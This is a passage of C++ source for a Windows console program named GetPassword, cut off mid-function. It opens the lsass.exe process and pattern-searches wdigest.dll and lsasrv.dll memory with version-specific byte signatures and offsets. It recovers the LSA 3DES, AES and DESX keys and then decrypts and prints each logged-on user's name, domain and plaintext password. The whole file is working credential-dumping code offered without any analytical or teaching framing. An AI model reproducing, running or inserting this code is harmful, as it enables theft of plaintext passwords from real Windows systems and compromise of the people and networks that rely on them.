// GetPassword.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include "GetPassword.h"
#include "process.h"
#include <Ntsecapi.h>
#include <sstream>
#include <iostream>
#include <iomanip>
#include <wincred.h>
#include <Psapi.h>
#include <Security.h>
#include <Ntsecpkg.h>

using namespace std;

#pragma comment(lib,"secur32.lib")
#pragma warning(disable:4146)

#define RtlEqualLuid(L1, L2) (((L1)->LowPart == (L2)->LowPart) && ((L1)->HighPart == (L2)->HighPart))


bool lsassOK = false;


PBASIC_MODULEENTRY pModWDIGEST = NULL;
PWDIGEST_LIST_ENTRY l_LogSessList = NULL;
long offsetWDigestPrimary = 0;

OSVERSIONINFOEX GLOB_Version;
//HANDLE g_hProc = INVALID_HANDLE_VALUE;
//BYTE *g_pModule = NULL;
//DWORD g_SizeOfModule = 0;
PLSA_SECPKG_FUNCTION_TABLE SeckPkgFunctionTable = NULL;
HMODULE hLsaSrv = NULL;
HANDLE hLSASS = NULL;
//vector<MODULE_PKG_LSA> MyModules;
BASIC_MODULEENTRY localLSASRV, *pModLSASRV = NULL;
PBYTE *g_pRandomKey_nt5 = NULL, *g_pDESXKey_nt5 = NULL;
HMODULE hBCrypt = NULL;
PBYTE AESKey = NULL, DES3Key = NULL;
PBCRYPT_KEY * hAesKey = NULL, *h3DesKey = NULL;
BCRYPT_ALG_HANDLE *hAesProvider = NULL, *h3DesProvider = NULL;

BYTE Random3DES[24], RandomAES[16];
PLIST_ENTRY LogonSessionList = NULL;
PULONG LogonSessionListCount = NULL;

#ifdef _M_X64
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]	= {0x33, 0xdb, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3};
LONG OFFS_WNT5_g_pRandomKey							= -(6 + 2 + 5 + sizeof(long));
LONG OFFS_WNT5_g_cbRandomKey						= OFFS_WNT5_g_pRandomKey - (3 + sizeof(long));
LONG OFFS_WNT5_g_pDESXKey							= OFFS_WNT5_g_cbRandomKey - (2 + 5 + sizeof(long));
LONG OFFS_WNT5_g_Feedback							= OFFS_WNT5_g_pDESXKey - (3 + 7 + 6 + 2 + 5 + 5 + sizeof(long));
#elif defined _M_IX86
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]	= {0x84, 0xc0, 0x74, 0x44, 0x6a, 0x08, 0x68};
LONG OFFS_WNT5_g_Feedback							= sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
LONG OFFS_WNT5_g_pRandomKey							= OFFS_WNT5_g_Feedback	+ sizeof(long) + 5 + 2 + 2 + 2;
LONG OFFS_WNT5_g_pDESXKey							= OFFS_WNT5_g_pRandomKey+ sizeof(long) + 2;
LONG OFFS_WNT5_g_cbRandomKey						= OFFS_WNT5_g_pDESXKey	+ sizeof(long) + 5 + 2;
#endif

#ifdef _M_X64
BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x0D};
LONG OFFS_WNO8_hAesKey								= sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY) + sizeof(LONG) + 5 + 3;
LONG OFFS_WN61_h3DesKey								= - (2 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 2 + 2 + 2 + 5 + 5 + 8 + 3 + sizeof(long));
LONG OFFS_WN61_InitializationVector					= OFFS_WNO8_hAesKey + sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 2 + 4 + 3;
LONG OFFS_WN60_h3DesKey								= - (6 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 6 + 2 + 2 + 5 + 5 + 8 + 3 + sizeof(long));
LONG OFFS_WN60_InitializationVector					= OFFS_WNO8_hAesKey + sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 6 + 4 + 3;

BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8B, 0x0D};
LONG OFFS_WIN8_hAesKey								= sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY) + sizeof(LONG) + 4 + 3;
LONG OFFS_WIN8_h3DesKey								= - (6 + 2 + 2 + 6 + 3 + 4 + 2 + 4 + 5 + 6 + 2 + 2 + 6 + 5 + 8 + 3 + sizeof(long));
LONG OFFS_WIN8_InitializationVector					= OFFS_WIN8_hAesKey + sizeof(long) + 3 + 4 + 5 + 6 + 2 + 2 + 6 + 4 + 3;
#elif defined _M_IX86
BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x8B, 0xF0, 0x3B, 0xF3, 0x7C, 0x2C, 0x6A, 0x02, 0x6A, 0x10, 0x68};
LONG OFFS_WNO8_hAesKey								= -(5 + 6 + sizeof(long));
LONG OFFS_WNO8_h3DesKey								= OFFS_WNO8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 1 + 2 + 2 + 2 + 5 + 1 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 5 + 6 + sizeof(long));
LONG OFFS_WNO8_InitializationVector					= sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);

BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x8B, 0xF0, 0x85, 0xF6, 0x78, 0x2A, 0x6A, 0x02, 0x6A, 0x10, 0x68};
LONG OFFS_WIN8_hAesKey								= -(2 + 6 + sizeof(long));
LONG OFFS_WIN8_h3DesKey								= OFFS_WIN8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 2 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 6 + sizeof(long));
LONG OFFS_WIN8_InitializationVector					= sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY);
#endif

wstring stringOfSTRING(UNICODE_STRING maString)
{
	return wstring(maString.Buffer,maString.Length/sizeof(TCHAR));
}

void wait()
{
	MSG msg;
	while (GetMessage(&msg,NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

bool getVersion(OSVERSIONINFOEX * maVersion)
{
	RtlZeroMemory(maVersion, sizeof(OSVERSIONINFOEX));
	maVersion->dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	return (GetVersionEx(reinterpret_cast<LPOSVERSIONINFO>(maVersion)) != 0);
}


wstring getWinError(bool automatic = true, DWORD code = 0)
{
	bool success = false;
	DWORD dwError = (automatic ? GetLastError() : code);
	wostringstream result;
	wchar_t * Buffer = NULL;

	result << L"(0x" << setw(sizeof(DWORD)*2) << setfill(wchar_t('0')) << hex << dwError << dec << L')';
	if(!(success = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_MAX_WIDTH_MASK,
		NULL,
		dwError,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		reinterpret_cast<wchar_t *>(&Buffer),
		0, NULL) != 0))
		success = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_MAX_WIDTH_MASK | FORMAT_MESSAGE_FROM_HMODULE,
		GetModuleHandle(L"ntdll"),
		dwError,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		reinterpret_cast<wchar_t *>(&Buffer),
		0, NULL) != 0;

	if(success)
	{
		result << L' ' << Buffer;
		LocalFree(Buffer);
	}
	else result << L" * Unable to get a message *";

	return result.str();
}

bool searchMemory(const PBYTE BaseAddress,const PBYTE addressMaxMin,const PBYTE pattern, PBYTE *PatternAddress,size_t length,bool forward = true,HANDLE handleProcess = INVALID_HANDLE_VALUE)
{
	BYTE *myTab = new BYTE[length];
	ZeroMemory(myTab,length);
	*PatternAddress = BaseAddress;
	bool bRead = true;
	bool bPattern = false;
	while ((!addressMaxMin || (forward ? (*PatternAddress + length) <= addressMaxMin : (*PatternAddress - length) >= addressMaxMin)) && bRead && !bPattern)
	{
		if (bRead = readMemory(*PatternAddress,myTab,length,handleProcess))
		{
			if (!(bPattern = (memcmp(myTab,pattern,length) == 0)))
			{
				*PatternAddress += (forward ? 1 : -1);
			}
		}
	}

	delete[] myTab;
	if (!bPattern)
		*PatternAddress = NULL;

	return bPattern;
}

bool genericPatternSearch(PBYTE * thePtr, WCHAR *moduleName, BYTE pattern[], ULONG sizeofPattern,LONG offSetToPtr, char *startFunc = NULL, bool forward = true,bool noPtr = false)
{
	bool result = false;
	if (thePtr && pattern && sizeofPattern)
	{
		if(HMODULE myModule = GetModuleHandle(moduleName))
		{
			MODULEINFO Infos;
			if(GetModuleInformation(GetCurrentProcess(), myModule, &Infos, sizeof(MODULEINFO)))
			{
				PBYTE addrOfModule = reinterpret_cast<PBYTE>(Infos.lpBaseOfDll);

				if(PBYTE addrStart = startFunc ? reinterpret_cast<PBYTE>(GetProcAddress(myModule, startFunc)) : addrOfModule)
				{
					if(result = searchMemory(addrStart, forward ? (addrOfModule + Infos.SizeOfImage) : reinterpret_cast<PBYTE>(Infos.lpBaseOfDll), pattern, thePtr, sizeofPattern, forward))
					{
						*thePtr += offSetToPtr;
						if(!noPtr)
						{
#ifdef _M_X64
							*thePtr += sizeof(long) + *reinterpret_cast<long *>(*thePtr);
#elif defined _M_IX86
							*thePtr = *reinterpret_cast<PBYTE *>(*thePtr);
#endif
						}
					}
					else *thePtr = NULL;
				}
			}
		}
	}
	return result;
}

void Privilege(TCHAR *pszPrivilege,BOOL bEnable)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;

	if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
		printf("OpenProcessToken:%d\n",GetLastError());

	if (!LookupPrivilegeValue(NULL,pszPrivilege,&tp.Privileges[0].Luid))
		printf("LookupPrivilegeValue:%d\n",GetLastError());

	tp.PrivilegeCount = 1;

	if (bEnable)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hToken,FALSE,&tp,0,(PTOKEN_PRIVILEGES)NULL,0))
		printf("AdjustTokenPrivilege:%d\n",GetLastError());

	if (!CloseHandle(hToken))
		printf("CloseHandle:%d\n",GetLastError());
}

wstring stringOfHex(const BYTE myTab[], DWORD mySize, DWORD length = 0)
{
	wostringstream Stream;
	for(DWORD j = 0; j < mySize; j++)
	{
		Stream << setw(2) << setfill(wchar_t('0')) << hex << myTab[j];
		if(length != 0)
		{
			Stream << L' ';
			if ((j + 1) % length == 0)
				Stream << endl;
		}
	}
	return Stream.str();
}

wstring stringOrHex(const BYTE myTab[], DWORD mySize, DWORD length = 32, bool line = true)
{
	wstring result;
	if(myTab && length > 0)
	{
		int flags = IS_TEXT_UNICODE_ODD_LENGTH | IS_TEXT_UNICODE_STATISTICS /*| IS_TEXT_UNICODE_NULL_BYTES*/;
		if(IsTextUnicode(myTab, mySize, &flags))
		{
			result.assign(reinterpret_cast<const wchar_t *>(myTab), mySize / sizeof(wchar_t));
		}
		else
		{
			if(line)
				result.assign(L"\n");
			result.append(stringOfHex(myTab, mySize, length));
		}
	}
	else result.assign(L"<NULL>");

	return result;
}

bool searchAndInitLSASSData_nt5()
{
	PBYTE ptrBase = NULL;
	DWORD mesSucces = 0;
	if(searchMemory(localLSASRV.modBaseAddr, localLSASRV.modBaseAddr + localLSASRV.modBaseSize, PTRN_WNT5_LsaInitializeProtectedMemory_KEY, &ptrBase, sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY)))
	{
#ifdef _M_X64
		PBYTE g_Feedback		= reinterpret_cast<PBYTE  >((ptrBase + OFFS_WNT5_g_Feedback)	+ sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_Feedback));
		g_pRandomKey_nt5		= reinterpret_cast<PBYTE *>((ptrBase + OFFS_WNT5_g_pRandomKey)	+ sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_pRandomKey));
		g_pDESXKey_nt5			= reinterpret_cast<PBYTE *>((ptrBase + OFFS_WNT5_g_pDESXKey)	+ sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_pDESXKey));
		PDWORD g_cbRandomKey	= reinterpret_cast<PDWORD >((ptrBase + OFFS_WNT5_g_cbRandomKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_cbRandomKey));
#elif defined _M_IX86
		PBYTE g_Feedback		= *reinterpret_cast<PBYTE  *>(ptrBase + OFFS_WNT5_g_Feedback);
		g_pRandomKey_nt5		= *reinterpret_cast<PBYTE **>(ptrBase + OFFS_WNT5_g_pRandomKey);
		g_pDESXKey_nt5				= *reinterpret_cast<PBYTE **>(ptrBase + OFFS_WNT5_g_pDESXKey);
		PDWORD g_cbRandomKey	= *reinterpret_cast<PDWORD *>(ptrBase + OFFS_WNT5_g_cbRandomKey);
#endif
		*g_Feedback = NULL; *g_pRandomKey_nt5 = NULL; *g_pDESXKey_nt5 = NULL; *g_cbRandomKey = NULL;

		mesSucces = 0;
		if(readMemory(pModLSASRV->modBaseAddr + (g_Feedback - localLSASRV.modBaseAddr), g_Feedback, 8, hLSASS))
			mesSucces++;
		if(readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(g_cbRandomKey) - localLSASRV.modBaseAddr), g_pRandomKey_nt5, sizeof(DWORD), hLSASS))
			mesSucces++;
		if(readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(g_pRandomKey_nt5) - localLSASRV.modBaseAddr), &ptrBase, sizeof(PBYTE), hLSASS))
		{
			mesSucces++;
			*g_pRandomKey_nt5 = new BYTE[*g_cbRandomKey];
			if(readMemory(ptrBase, *g_pRandomKey_nt5, *g_cbRandomKey, hLSASS))
				mesSucces++;
		}
		if(readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(g_pDESXKey_nt5) - localLSASRV.modBaseAddr), &ptrBase, sizeof(PBYTE), hLSASS))
		{
			mesSucces++;
			*g_pDESXKey_nt5 = new BYTE[144];
			if(readMemory(ptrBase, *g_pDESXKey_nt5, 144, hLSASS))
				mesSucces++;
		}
	}
	else wcout << L"searchMemory NT5 " << getWinError() << endl; 
	return (mesSucces == 6);
}

bool LsaInitializeProtectedMemory()
{
	bool resultat = false;

	PBCRYPT_OPEN_ALGORITHM_PROVIDER K_BCryptOpenAlgorithmProvider = reinterpret_cast<PBCRYPT_OPEN_ALGORITHM_PROVIDER>(GetProcAddress(hBCrypt, "BCryptOpenAlgorithmProvider"));
	PBCRYPT_SET_PROPERTY K_BCryptSetProperty = reinterpret_cast<PBCRYPT_SET_PROPERTY>(GetProcAddress(hBCrypt, "BCryptSetProperty"));
	PBCRYPT_GET_PROPERTY K_BCryptGetProperty = reinterpret_cast<PBCRYPT_GET_PROPERTY>(GetProcAddress(hBCrypt, "BCryptGetProperty"));
	PBCRYPT_GENERATE_SYMMETRIC_KEY K_BCryptGenerateSymmetricKey = reinterpret_cast<PBCRYPT_GENERATE_SYMMETRIC_KEY>(GetProcAddress(hBCrypt, "BCryptGenerateSymmetricKey"));

	if(NT_SUCCESS(K_BCryptOpenAlgorithmProvider(h3DesProvider, BCRYPT_3DES_ALGORITHM, NULL, 0)) && 
		NT_SUCCESS(K_BCryptOpenAlgorithmProvider(hAesProvider, BCRYPT_AES_ALGORITHM, NULL, 0)))
	{
		if(NT_SUCCESS(K_BCryptSetProperty(*h3DesProvider, BCRYPT_CHAINING_MODE, reinterpret_cast<PBYTE>(BCRYPT_CHAIN_MODE_CBC), sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) &&
			NT_SUCCESS(K_BCryptSetProperty(*hAesProvider, BCRYPT_CHAINING_MODE, reinterpret_cast<PBYTE>(BCRYPT_CHAIN_MODE_CFB), sizeof(BCRYPT_CHAIN_MODE_CFB), 0)))
		{
			DWORD DES3KeyLen, AESKeyLen, cbLen;

			if(NT_SUCCESS(K_BCryptGetProperty(*h3DesProvider, BCRYPT_OBJECT_LENGTH, reinterpret_cast<PBYTE>(&DES3KeyLen), sizeof(DES3KeyLen), &cbLen, 0)) &&
				NT_SUCCESS(K_BCryptGetProperty(*hAesProvider, BCRYPT_OBJECT_LENGTH, reinterpret_cast<PBYTE>(&AESKeyLen), sizeof(AESKeyLen), &cbLen, 0)))
			{
				DES3Key = new BYTE[DES3KeyLen];
				AESKey = new BYTE[AESKeyLen];

				resultat = NT_SUCCESS(K_BCryptGenerateSymmetricKey(*h3DesProvider, (BCRYPT_KEY_HANDLE *) h3DesKey, DES3Key, DES3KeyLen, Random3DES, sizeof(Random3DES), 0)) &&
					NT_SUCCESS(K_BCryptGenerateSymmetricKey(*hAesProvider, (BCRYPT_KEY_HANDLE *) hAesKey, AESKey, AESKeyLen, RandomAES, sizeof(RandomAES), 0));
			}
		}
	}
	return resultat;
}


bool searchAndInitLSASSData_nt6()
{
	if(!hBCrypt)
		hBCrypt = LoadLibrary(L"bcrypt");

	PBYTE PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
	ULONG SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
	LONG OFFS_WNT6_hAesKey, OFFS_WNT6_h3DesKey, OFFS_WNT6_InitializationVector;
	if(GLOB_Version.dwBuildNumber < 8000)
	{
		PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WNO8_LsaInitializeProtectedMemory_KEY;
		SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);
		OFFS_WNT6_hAesKey = OFFS_WNO8_hAesKey;
#ifdef _M_X64
		if(GLOB_Version.dwMinorVersion < 1)
		{
			OFFS_WNT6_h3DesKey = OFFS_WN60_h3DesKey;
			OFFS_WNT6_InitializationVector = OFFS_WN60_InitializationVector;
		}
		else
		{
			OFFS_WNT6_h3DesKey = OFFS_WN61_h3DesKey;
			OFFS_WNT6_InitializationVector = OFFS_WN61_InitializationVector;
		}
#elif defined _M_IX86
		OFFS_WNT6_h3DesKey = OFFS_WNO8_h3DesKey;
		OFFS_WNT6_InitializationVector = OFFS_WNO8_InitializationVector;
#endif
	}
	else
	{
		PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WIN8_LsaInitializeProtectedMemory_KEY;
		SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY);
		OFFS_WNT6_hAesKey = OFFS_WIN8_hAesKey;
		OFFS_WNT6_h3DesKey = OFFS_WIN8_h3DesKey;
		OFFS_WNT6_InitializationVector = OFFS_WIN8_InitializationVector;
	}

	PBYTE ptrBase = NULL;
	DWORD mesSucces = 0;
	if(searchMemory(localLSASRV.modBaseAddr, localLSASRV.modBaseAddr + localLSASRV.modBaseSize, PTRN_WNT6_LsaInitializeProtectedMemory_KEY, &ptrBase, SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY))
	{
#ifdef _M_X64
		LONG OFFS_WNT6_AdjustProvider = (GLOB_Version.dwBuildNumber < 8000) ? 5 : 4;
		PBYTE InitializationVector = reinterpret_cast<PBYTE  >((ptrBase + OFFS_WNT6_InitializationVector) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_InitializationVector));
		hAesKey			= reinterpret_cast<PBCRYPT_KEY *>((ptrBase + OFFS_WNT6_hAesKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_hAesKey));
		h3DesKey		= reinterpret_cast<PBCRYPT_KEY *>((ptrBase + OFFS_WNT6_h3DesKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_h3DesKey));
		hAesProvider	= reinterpret_cast<BCRYPT_ALG_HANDLE *>((ptrBase + OFFS_WNT6_hAesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_hAesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)));
		h3DesProvider	= reinterpret_cast<BCRYPT_ALG_HANDLE *>((ptrBase + OFFS_WNT6_h3DesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_h3DesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)));
#elif defined _M_IX86
		PBYTE InitializationVector = *reinterpret_cast<PBYTE * >(ptrBase + OFFS_WNT6_InitializationVector);
		hAesKey			= *reinterpret_cast<PBCRYPT_KEY **>(ptrBase + OFFS_WNT6_hAesKey);
		h3DesKey		= *reinterpret_cast<PBCRYPT_KEY **>(ptrBase + OFFS_WNT6_h3DesKey);
		hAesProvider	= *reinterpret_cast<BCRYPT_ALG_HANDLE **>(ptrBase + OFFS_WNT6_hAesKey + sizeof(PVOID) + 2);
		h3DesProvider	= *reinterpret_cast<BCRYPT_ALG_HANDLE **>(ptrBase + OFFS_WNT6_h3DesKey + sizeof(PVOID) + 2);
#endif
		if(hBCrypt && LsaInitializeProtectedMemory())
		{
			if(readMemory(pModLSASRV->modBaseAddr + (InitializationVector - localLSASRV.modBaseAddr), InitializationVector, 16, hLSASS))
				mesSucces++;

			BCRYPT_KEY maCle;
			BCRYPT_KEY_DATA maCleData;

			if(readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(hAesKey) - localLSASRV.modBaseAddr), &ptrBase, sizeof(PBYTE), hLSASS))
				if(readMemory(ptrBase, &maCle, sizeof(BCRYPT_KEY), hLSASS))
					if(readMemory(maCle.cle, &maCleData, sizeof(BCRYPT_KEY_DATA), hLSASS))
						if(readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(BCRYPT_KEY_DATA, data), &(*hAesKey)->cle->data, maCleData.size - FIELD_OFFSET(BCRYPT_KEY_DATA, data) - 2*sizeof(PVOID), hLSASS)) //Two internal pointers in the end, the original structure was not useless
							mesSucces++;

			if(readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(h3DesKey) - localLSASRV.modBaseAddr), &ptrBase, sizeof(PBYTE), hLSASS))
				if(readMemory(ptrBase, &maCle, sizeof(BCRYPT_KEY), hLSASS))
					if(readMemory(maCle.cle, &maCleData, sizeof(BCRYPT_KEY_DATA), hLSASS))
						if(readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(BCRYPT_KEY_DATA, data), &(*h3DesKey)->cle->data, maCleData.size - FIELD_OFFSET(BCRYPT_KEY_DATA, data), hLSASS))
							mesSucces++;
		}
		else wcout << L"LsaInitializeProtectedMemory NT6 ERROR " << endl;
	}
	else wcout << L"searchMemory NT6 ERROR " << getWinError() << endl; 

	return (mesSucces == 3);
}


bool searchLSASSDatas()
{
	if (!lsassOK)
	{
		if (!hLSASS)
		{
			MY_PROCESSENTRY32 myProcess;
			wstring processName = TEXT("lsass.exe");
			if (getUniqueFromName(&myProcess,&processName))
			{
				if (hLSASS = OpenProcess(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION,false,myProcess.th32ProcessID))
				{
					vector<BASIC_MODULEENTRY> myVectorModules;
					if (getBasicModulesListOfProcess(&myVectorModules,hLSASS))
					{
						for (vector<BASIC_MODULEENTRY>::iterator iter = myVectorModules.begin();iter != myVectorModules.end();iter++)
						{
							if((_wcsicmp(iter->szModule.c_str(), TEXT("wdigest.dll")) == 0) && !(pModWDIGEST))
							{										
								pModWDIGEST = new BASIC_MODULEENTRY(*iter);			
							}
							else if ((_wcsicmp(iter->szModule.c_str(), TEXT("lsasrv.dll")) == 0) && !(pModLSASRV))
							{
								pModLSASRV = new BASIC_MODULEENTRY(*iter);
							}
						}

						if (!pModLSASRV || !pModWDIGEST)
						{
							wcout << TEXT("Search pModWDIGEST or pModLSASRV error") << endl;
							return lsassOK;
						}
					}
					else
					{
						wcout << TEXT("getBasicModulesListOfProcess : ") << getWinError() << endl;
						CloseHandle(hLSASS);
						hLSASS = NULL;
					}
				} else wcout << TEXT("OpenProcess : ") << getWinError() << endl;
			} else wcout << TEXT("getUniqueForName : ") << getWinError() << endl;
		} 

		if (hLSASS)
		{
			MODULEINFO Infos;
			if(GetModuleInformation(GetCurrentProcess(), hLsaSrv, &Infos, sizeof(MODULEINFO)))
			{
				localLSASRV.modBaseAddr = reinterpret_cast<PBYTE>(Infos.lpBaseOfDll);
				localLSASRV.modBaseSize = Infos.SizeOfImage;

				if(!SeckPkgFunctionTable)
				{
					struct {PVOID LsaIRegisterNotification; PVOID LsaICancelNotification;} extractPkgFunctionTable = {GetProcAddress(hLsaSrv, "LsaIRegisterNotification"), GetProcAddress(hLsaSrv, "LsaICancelNotification")};
					if(extractPkgFunctionTable.LsaIRegisterNotification && extractPkgFunctionTable.LsaICancelNotification)
						genericPatternSearch(reinterpret_cast<PBYTE *>(&SeckPkgFunctionTable), L"lsasrv", reinterpret_cast<PBYTE>(&extractPkgFunctionTable), sizeof(extractPkgFunctionTable), - FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification), NULL, true, true);
				}

				lsassOK = (GLOB_Version.dwMajorVersion < 6) ? searchAndInitLSASSData_nt5() : searchAndInitLSASSData_nt6();
			}
		}
	}
	return lsassOK;
}


PLIST_ENTRY getPtrFromLinkedListByLuid(PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind)
{
	PLIST_ENTRY resultat = NULL;
	BYTE * monBuffer = new BYTE[LUIDoffset + sizeof(LUID)];
	PLIST_ENTRY pStruct = NULL;
	if(readMemory(pSecurityStruct, &pStruct, sizeof(pStruct), hLSASS))
	{
		while(pStruct != pSecurityStruct)
		{
			if(readMemory(pStruct, monBuffer, LUIDoffset + sizeof(LUID), hLSASS))
			{
				if(RtlEqualLuid(luidToFind, reinterpret_cast<PLUID>(reinterpret_cast<PBYTE>(monBuffer) + LUIDoffset)))
				{
					resultat = pStruct;
					break;
				}
			} else break;
			pStruct = reinterpret_cast<PLIST_ENTRY>(monBuffer)->Flink;
		}
	}
	delete [] monBuffer;
	return resultat;
}

void genericCredsToStream(PGENERIC_PRIMARY_CREDENTIAL mesCreds, bool isDomainFirst=false, PDWORD pos=NULL)
{
	if(mesCreds)
	{
		if(mesCreds->Password.Buffer || mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer)
		{
			wstring userName	= getUnicodeStringOfProcess(&mesCreds->UserName, hLSASS);
			wstring domainName	= getUnicodeStringOfProcess(&mesCreds->Domaine, hLSASS);
			wstring password	= getUnicodeStringOfProcess(&mesCreds->Password, hLSASS, SeckPkgFunctionTable->LsaUnprotectMemory);
			wstring rUserName	= (isDomainFirst ? domainName : userName);
			wstring rDomainName	= (isDomainFirst ? userName : domainName);

			

			if(!pos)
				wcout << endl <<
				L"* User: " << rUserName << endl <<
				L"* Domain: " << rDomainName << endl <<
				L"* Password: " << password;
			else
				wcout << endl <<
				L" * [" << *pos  << L"] User : " << rUserName << endl <<
				L"       Domain : " << rDomainName << endl <<
				L"       Password : " << password;
			
		}
	} else wcout << L" (LUID ERROR) ";
}

bool searchWDigestEntryList()
{
#ifdef _M_X64
	BYTE PTRN_WNO8_InsertInLogSess[]= {0x4c, 0x89, 0x1b, 0x48, 0x89, 0x43, 0x08, 0x49, 0x89, 0x5b, 0x08, 0x48, 0x8d};
	BYTE PTRN_W8CP_InsertInLogSess[]= {0x4c, 0x89, 0x1b, 0x48, 0x89, 0x4b, 0x08, 0x49, 0x8b, 0x43, 0x08, 0x4c, 0x39};
	BYTE PTRN_W8RP_InsertInLogSess[]= {0x4c, 0x89, 0x1b, 0x48, 0x89, 0x43, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85};
#elif defined _M_IX86
	BYTE PTRN_WNO8_InsertInLogSess[]= {0x8b, 0x45, 0x08, 0x89, 0x08, 0xc7, 0x40, 0x04};
	BYTE PTRN_W8CP_InsertInLogSess[]= {0x89, 0x0e, 0x89, 0x56, 0x04, 0x8b, 0x41, 0x04};
	BYTE PTRN_W8RP_InsertInLogSess[]= {0x89, 0x06, 0x89, 0x4e, 0x04, 0x39, 0x48, 0x04};
#endif
	LONG OFFS_WALL_InsertInLogSess	= -4;

	if(searchLSASSDatas() && pModWDIGEST && !l_LogSessList)
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;

		pointeur= reinterpret_cast<PBYTE *>(&l_LogSessList);
		offset	= OFFS_WALL_InsertInLogSess;
		if(GLOB_Version.dwBuildNumber < 8000)
		{
			pattern	= PTRN_WNO8_InsertInLogSess;
			taille	= sizeof(PTRN_WNO8_InsertInLogSess);
		}
		else if(GLOB_Version.dwBuildNumber < 8400)
		{
			pattern	= PTRN_W8CP_InsertInLogSess;
			taille	= sizeof(PTRN_W8CP_InsertInLogSess);
		}
		else
		{
			pattern	= PTRN_W8RP_InsertInLogSess;
			taille	= sizeof(PTRN_W8RP_InsertInLogSess);
		}

		if(HMODULE monModule = LoadLibrary(L"wdigest"))
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), monModule, &mesInfos, sizeof(MODULEINFO)))
			{
				genericPatternSearch(pointeur, L"wdigest", pattern, taille, offset, "SpInstanceInit", false);
				*pointeur += pModWDIGEST->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
			}
			FreeLibrary(monModule);
		}

#ifdef _M_X64
